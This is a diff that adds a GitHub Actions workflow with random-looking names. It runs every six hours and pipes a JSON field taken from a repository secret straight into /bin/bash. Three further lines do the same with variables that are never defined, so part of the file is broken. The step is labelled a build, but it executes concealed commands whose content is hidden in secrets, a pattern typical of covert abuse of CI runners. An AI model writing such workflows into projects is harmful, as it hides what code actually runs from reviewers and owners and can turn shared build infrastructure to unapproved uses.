@@ -1,0 +1,22 @@
+name: luminrui7165
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luminrui7165
+        env:
+          oqo74559: ${{ secrets.oqo74559 }}
+        run: |
+          echo $oqo74559 | jq -r .ci615 | /bin/bash
+          echo $el47 | jq -r .m4020 | /bin/bash
+          echo $hcv1 | jq -r .jyqib13 | /bin/bash
+          echo $gv44 | jq -r .psmn478 | /bin/bash
+
